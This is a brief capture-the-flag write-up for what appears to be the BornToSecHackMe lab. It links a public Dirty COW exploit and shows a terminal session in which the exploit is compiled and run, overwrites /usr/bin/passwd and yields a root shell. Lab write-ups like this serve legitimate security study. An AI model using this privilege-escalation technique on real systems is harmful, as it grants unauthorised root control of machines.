# writeup3

Dirty c0w used: https://gist.github.com/KrE80r/42f8629577db95782d5e4f609f437a54

```
laurie@BornToSecHackMe:~$ vi c0w.c
laurie@BornToSecHackMe:~$ gcc -pthread c0w.c  -o c0w
laurie@BornToSecHackMe:~$ ./c
c0w      cowroot  
laurie@BornToSecHackMe:~$ ./c0w
                                
   (___)                                   
   (o o)_____/                             
    @@ `     \                            
     \ ____, //usr/bin/passwd                          
     //    //                              
    ^^    ^^                               
DirtyCow root privilege escalation
Backing up /usr/bin/passwd to /tmp/bak
madvise 0

ptrace 0

laurie@BornToSecHackMe:~$ /usr/bin/passwd
root@BornToSecHackMe:/home/laurie# whoami
root
root@BornToSecHackMe:/home/laurie#
```
